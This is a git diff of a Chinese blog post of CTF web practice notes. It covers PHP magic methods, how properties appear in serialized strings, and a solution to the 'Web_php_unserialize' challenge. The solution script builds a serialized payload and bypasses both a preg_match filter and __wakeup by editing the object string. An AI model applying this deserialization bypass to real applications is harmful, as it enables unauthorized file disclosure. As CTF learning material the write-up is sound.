@@ -1,9 +1,9 @@
 ---
-title: ctf-web练习
+title: ctf-web练习(php)
 date: 2023-09-18 00:30:52
 tags:
 ---
-# ctf-web练习--待补充
+# ctf-web练习(php)--待补充
 
 ## 代码审计基础知识
 
@@ -15,12 +15,42 @@ tags:
 
 ## php知识
 
-### php的一些方法
+### php的魔术方法
 
 - __construct() 当一个对象创建时被调用 --构造函数
 - __destruct() 当一个对象销毁时被调用 --析构函数
 - __wakeup() 使用unserialize时触发
 - __sleep() 使用serialize时触发
+- __toString()  当一个对象被当做一个字符串时来使用
+
+### php的变量类型
+
+public：属性被序列化的时候属性值会变成 `属性名`
+
+protected：属性被序列化的时候属性值会变成 `\x00*\x00属性名`
+
+private：属性被序列化的时候属性值会变成 `\x00类名\x00属性名`
+
+```php
+<?php
+class People{
+    public $id;
+    protected $gender;
+    private $age;
+    public function __construct(){
+        $this->id = 'Hardworking666';
+        $this->gender = 'male';
+        $this->age = '18';
+    }
+}
+$a = new People();
+echo serialize($a);
+?>
+//O:6:"People":3:{s:2:"id";s:14:"Hardworking666";s:9:" * gender";s:4:"male";s:11:" People age";s:2:"18";}
+
+```
+
+注意：比如，$file 是私有成员，序列化之后字符串首尾会多出两个空格 “%00*%00”，如果有时候利用html网页复制值可能会出现问题。
 
 ### php序列化和反序列化
 
@@ -30,7 +60,13 @@ PHP序列化：serialize()
 
 而PHP反序列化：unserialize()
 
-反序列化是将字符串转换成变量或对象的过程
+反序列化是将字符串转换成变量或对象的过程。
+
+从序列化到反序列化这几个函数的执行过程是：
+
+```php
+__construct()` ->`__sleep()` -> `__wakeup()` -> `__toString()` -> `__destruct()
+```
 
 ```php
 <?php  
@@ -81,5 +117,50 @@ PHP**反序列化漏洞**：执行unserialize()时，先会调用__wakeup()。
 
 了解绕过常见的**函数过滤**机制
 
+### 3.Web_php_unserialize
 
+类似于上题，只是多了一个正则过滤问题
+
+![image-20230925181847920](https://s2.loli.net/2023/09/25/vbW31rf7uKmqcSk.png)
+
+```php
+<?php 
+class Demo { 
+    private $file = 'index.php';
+    public function __construct($file) { 
+        $this->file = $file; 
+    }
+    function __destruct() { 
+        echo @highlight_file($this->file, true); 
+    }
+    function __wakeup() { 
+        if ($this->file != 'index.php') { 
+            //the secret is in the fl4g.php
+            $this->file = 'index.php'; 
+        } 
+    } 
+}
+
+    $A = new Demo('fl4g.php');
+    $C = serialize($A);
+    //string(49) "O:4:"Demo":1:{s:10:"Demofile";s:8:"fl4g.php";}"
+    $C = str_replace('O:4', 'O:+4',$C);//绕过preg_match
+    $C = str_replace(':1:', ':2:',$C);//绕过wakeup
+
+    var_dump(base64_encode($C));
+   
+
+    
+?>
+```
+
+曾出现的问题：
+
+$file 是私有成员序列化之后字符串首尾会多出两个空格 “%00*%00”，所以base64加密最好在代码中执行防止复制漏掉----本人刚开始的解题思路便是启动服务器输出序列化后的字符串然后进行复制，再在代码中进入下一步操作，然后出现了问题。
+
+#### 参考链接
+
+https://blog.csdn.net/Hardworking666/article/details/122373938
+
+https://www.cnblogs.com/hugboy/p/web_php_unserialize.html
 
